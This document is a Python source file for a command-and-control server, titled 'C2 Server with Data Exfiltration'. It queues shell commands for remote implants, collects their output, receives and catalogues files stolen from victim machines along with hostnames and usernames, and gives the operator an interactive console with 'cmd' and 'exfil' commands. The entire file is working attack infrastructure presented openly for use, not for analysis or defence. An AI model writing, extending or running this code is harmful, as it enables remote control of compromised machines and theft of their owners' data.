# C2 Server with Data Exfiltration

from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import queue
import json
import base64
import os
import hashlib
import sys
from datetime import datetime
from urllib.parse import urlparse, parse_qs
import shutil

# Create directories for storing exfiltrated data
EXFIL_DIR = "exfiltrated_data"
UPLOADS_DIR = os.path.join(EXFIL_DIR, "uploads")
METADATA_DIR = os.path.join(EXFIL_DIR, "metadata")
os.makedirs(UPLOADS_DIR, exist_ok=True)
os.makedirs(METADATA_DIR, exist_ok=True)

# Data structures
command_queue = queue.Queue()
response_queue = queue.Queue()
exfil_tasks = queue.Queue()
connected_clients = {}
client_info_db = {}

class C2HTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    
    def _set_headers(self, status=200):
        self.send_response(status)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
    
    def do_GET(self):
        parsed_path = urlparse(self.path)
        client_ip = self.client_address[0]
        
        # Update client last seen
        if client_ip not in connected_clients:
            connected_clients[client_ip] = {
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'requests': 1
            }
        else:
            connected_clients[client_ip]['last_seen'] = datetime.now().isoformat()
            connected_clients[client_ip]['requests'] += 1
        
        if parsed_path.path == '/command':
            try:
                cmd = command_queue.get(timeout=2)
                response = {
                    'type': 'command',
                    'command': cmd,
                    'timestamp': datetime.now().isoformat()
                }
                
            except queue.Empty:
                try:
                    task = exfil_tasks.get(timeout=0.1)
                    response = {
                        'type': 'exfil',
                        'task_id': task['task_id'],
                        'filename': task['filename'],
                        'action': task['action']
                    }
                    
                except queue.Empty:
                    response = {
                        'type': 'noop',
                        'timestamp': datetime.now().isoformat()
                    }
            
            self._set_headers()
            self.wfile.write(json.dumps(response).encode())
            
        elif parsed_path.path == '/download':
            query = parse_qs(parsed_path.query)
            filename = query.get('file', [''])[0]
            filepath = os.path.join(UPLOADS_DIR, filename)
            
            if os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    file_data = f.read()
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
                self.send_header('Content-Length', str(len(file_data)))
                self.end_headers()
                self.wfile.write(file_data)
            else:
                self._set_headers(404)
                self.wfile.write(json.dumps({'error': 'File not found'}).encode())
                
        else:
            self._set_headers(200)
            self.wfile.write(b'C2 Server Ready')
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        parsed_path = urlparse(self.path)
        client_ip = self.client_address[0]
        
        if parsed_path.path == '/upload':
            self._handle_file_upload(post_data, client_ip)
            
        elif parsed_path.path == '/exfil_result':
            self._handle_exfil_result(post_data, client_ip)
            
        else:
            self._handle_command_response(post_data, client_ip)
    
    def _handle_file_upload(self, post_data, client_ip):
        try:
            data = json.loads(post_data.decode())
            
            if 'filedata' in data and 'filename' in data:
                file_data = base64.b64decode(data['filedata'])
                filename = data['filename']
                metadata = data.get('metadata', {})
                
                safe_filename = self._sanitize_filename(filename)
                safe_filename = self._get_unique_filename(safe_filename)
                filepath = os.path.join(UPLOADS_DIR, safe_filename)
                
                with open(filepath, 'wb') as f:
                    f.write(file_data)
                
                file_hash = hashlib.sha256(file_data).hexdigest()
                file_size = len(file_data)
                
                metadata.update({
                    'original_filename': filename,
                    'safe_filename': safe_filename,
                    'file_size': file_size,
                    'sha256': file_hash,
                    'upload_time': datetime.now().isoformat(),
                    'client_ip': client_ip
                })
                
                if 'client_info' in data['metadata']:
                    client_info_db[client_ip] = data['metadata']['client_info']
                
                metadata_file = os.path.join(METADATA_DIR, f"{safe_filename}.json")
                with open(metadata_file, 'w') as f:
                    json.dump(metadata, f, indent=2)
                
                print(f"[+] File uploaded: {safe_filename} ({file_size:,} bytes) from {client_ip}")
                
                self._set_headers()
                response = {
                    'status': 'success',
                    'saved_as': safe_filename
                }
                self.wfile.write(json.dumps(response).encode())
                return
            
            self._set_headers(400)
            self.wfile.write(json.dumps({'error': 'Invalid data'}).encode())
                
        except Exception as e:
            self._set_headers(400)
            self.wfile.write(json.dumps({'error': str(e)}).encode())
    
    def _get_unique_filename(self, filename):
        base_name, ext = os.path.splitext(filename)
        counter = 1
        new_filename = filename
        
        while os.path.exists(os.path.join(UPLOADS_DIR, new_filename)):
            new_filename = f"{base_name}({counter}){ext}"
            counter += 1
        
        return new_filename
    
    def _handle_exfil_result(self, post_data, client_ip):
        try:
            result = json.loads(post_data.decode())
            task_id = result.get('task_id')
            status = result.get('status')
            
            if status == 'success':
                print(f"[+] Task {task_id} completed successfully")
            else:
                print(f"[!] Task {task_id} failed")
            
            self._set_headers()
            self.wfile.write(json.dumps({'status': 'acknowledged'}).encode())
            
        except:
            self._set_headers(400)
    
    def _handle_command_response(self, post_data, client_ip):
        try:
            response = json.loads(post_data.decode())
            response_queue.put((client_ip, response))
            
            if 'command' in response and 'stdout' in response:
                cmd = response['command']
                output = response['stdout'][:200].replace('\n', ' ')
                print(f"[+] Command output from {client_ip}: {cmd}")
                print(f"    {output}...")
            
            self._set_headers()
            self.wfile.write(json.dumps({'status': 'received'}).encode())
            
        except:
            response_queue.put((client_ip, post_data.decode()))
            self._set_headers()
            self.wfile.write(json.dumps({'status': 'received'}).encode())
    
    def _sanitize_filename(self, filename):
        filename = os.path.basename(filename)
        safe = ''.join(c for c in filename if c.isalnum() or c in '._- ')
        return safe

def start_http_server():
    try:
        server = HTTPServer(('192.168.1.9', 8080), C2HTTPHandler)
        print(f"[+] Server started: 192.168.1.9:8080")
        server.serve_forever()
        
    except OSError:
        server = HTTPServer(('192.168.1.9', 8080), C2HTTPHandler)
        print(f"[+] Server started: 192.168.1.9:8080")
        server.serve_forever()

def show_dashboard():
    files_count = len(os.listdir(UPLOADS_DIR))
    
    print("\n" + "="*50)
    print("C2 SERVER DASHBOARD")
    print("="*50)
    print(f"Connected Clients: {len(connected_clients)}")
    print(f"Exfiltrated Files: {files_count}")
    print(f"Pending Commands:  {command_queue.qsize()}")
    print("="*50)

def list_exfiltrated_files():
    files = os.listdir(UPLOADS_DIR)
    
    if not files:
        print("[!] No files exfiltrated")
        return
    
    print(f"\nExfiltrated Files ({len(files)}):")
    print("-" * 60)
    
    for i, filename in enumerate(sorted(files), 1):
        filepath = os.path.join(UPLOADS_DIR, filename)
        size = os.path.getsize(filepath)
        metadata_path = os.path.join(METADATA_DIR, f"{filename}.json")
        
        size_str = f"{size:,} bytes"
        if size > 1024*1024:
            size_str = f"{size/(1024*1024):.1f} MB"
        elif size > 1024:
            size_str = f"{size/1024:.1f} KB"
        
        if os.path.exists(metadata_path):
            with open(metadata_path, 'r') as f:
                metadata = json.load(f)
                client_ip = metadata.get('client_ip', 'Unknown')
        else:
            client_ip = "Unknown"
            
        print(f"{i:2}. {filename}")
        print(f"    Size: {size_str} | From: {client_ip}")
    
    print("-" * 60)

def view_file_metadata(filename):
    filepath = os.path.join(UPLOADS_DIR, filename)
    
    if not os.path.exists(filepath):
        print(f"[!] File not found")
        return
    
    metadata_path = os.path.join(METADATA_DIR, f"{filename}.json")
    if os.path.exists(metadata_path):
        with open(metadata_path, 'r') as f:
            metadata = json.load(f)
        
        print(f"\nFile Metadata: {filename}")
        print("-" * 40)
        print(f"Original Name: {metadata.get('original_filename', 'N/A')}")
        print(f"File Size:     {metadata.get('file_size', 0):,} bytes")
        print(f"Client IP:     {metadata.get('client_ip', 'N/A')}")
        print(f"Upload Time:   {metadata.get('upload_time', 'N/A')}")
        
        client_ip = metadata.get('client_ip')
        if client_ip in client_info_db:
            print("\nClient Info:")
            client_info = client_info_db[client_ip]
            print(f"  Hostname: {client_info.get('hostname', 'N/A')}")
            print(f"  Username: {client_info.get('username', 'N/A')}")
            print(f"  Platform: {client_info.get('platform', 'N/A')}")
        print("-" * 40)

def list_connected_clients():
    if not connected_clients:
        print("[!] No clients connected")
        return
    
    print(f"\nConnected Clients ({len(connected_clients)}):")
    print("-" * 60)
    
    for i, (client_ip, info) in enumerate(connected_clients.items(), 1):
        last_seen = datetime.fromisoformat(info['last_seen'])
        time_diff = (datetime.now() - last_seen).seconds
        status = "●" if time_diff < 60 else "○"
        
        client_info = client_info_db.get(client_ip, {})
        hostname = client_info.get('hostname', 'Unknown')
        username = client_info.get('username', 'Unknown')
        
        print(f"{status} {client_ip}")
        print(f"    Host: {hostname}\\{username}")
        print(f"    Last: {last_seen.strftime('%H:%M:%S')} ({time_diff}s ago)")
    
    print("-" * 60)

def view_command_responses():
    responses = []
    while not response_queue.empty():
        responses.append(response_queue.get())
    
    if not responses:
        print("[!] No command responses")
        return
    
    print(f"\nCommand Responses ({len(responses)}):")
    print("-" * 50)
    
    for i, (client_ip, response) in enumerate(responses, 1):
        if isinstance(response, dict):
            cmd = response.get('command', 'Unknown')
            stdout = response.get('stdout', '')
            
            if stdout:
                output = stdout[:80].replace('\n', ' ')
                print(f"{i}. {client_ip} - {cmd}")
                print(f"    {output}...")
    
    print("-" * 50)

def show_help():
    print("\nAvailable Commands:")
    print("  cmd [command]    - Execute command on client")
    print("  exfil [path]     - Upload file from client")
    print("  files            - List exfiltrated files")
    print("  view [file]      - View file metadata")
    print("  clients          - List connected clients")
    print("  responses        - View command responses")
    print("  dashboard        - Show server status")
    print("  clear            - Delete all files")
    print("  help             - Show this help")
    print("  exit             - Quit server")

def command_interface():
    print("\nC2 Server - Type 'help' for commands")
    
    task_counter = 1
    
    while True:
        try:
            user_input = input("\nC2> ").strip()
            
            if not user_input:
                continue
            
            parts = user_input.split()
            cmd = parts[0].lower()
            
            if cmd == 'exit':
                print("[+] Shutting down...")
                break
            
            elif cmd == 'files':
                list_exfiltrated_files()
            
            elif cmd == 'exfil' and len(parts) > 1:
                path = ' '.join(parts[1:])
                task = {
                    'task_id': f"T{task_counter:04d}",
                    'filename': path,
                    'action': 'upload'
                }
                exfil_tasks.put(task)
                print(f"[+] Task queued: {path}")
                task_counter += 1
            
            elif cmd == 'view' and len(parts) > 1:
                view_file_metadata(parts[1])
            
            elif cmd == 'clear':
                confirm = input("[!] Delete ALL files? (y/n): ")
                if confirm.lower() == 'y':
                    shutil.rmtree(EXFIL_DIR)
                    os.makedirs(UPLOADS_DIR, exist_ok=True)
                    os.makedirs(METADATA_DIR, exist_ok=True)
                    print("[+] All files cleared")
            
            elif cmd == 'clients':
                list_connected_clients()
            
            elif cmd == 'responses':
                view_command_responses()
            
            elif cmd == 'dashboard':
                show_dashboard()
            
            elif cmd == 'help':
                show_help()
            
            elif cmd == 'cmd' and len(parts) > 1:
                command = ' '.join(parts[1:])
                command_queue.put(command)
                print(f"[+] Command sent: {command}")
            
            else:
                command_queue.put(user_input)
                print(f"[+] Command sent: {user_input}")
        
        except KeyboardInterrupt:
            print("\n[!] Use 'exit' to quit")
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()
    
    command_interface()
    print("\n[+] Server stopped")
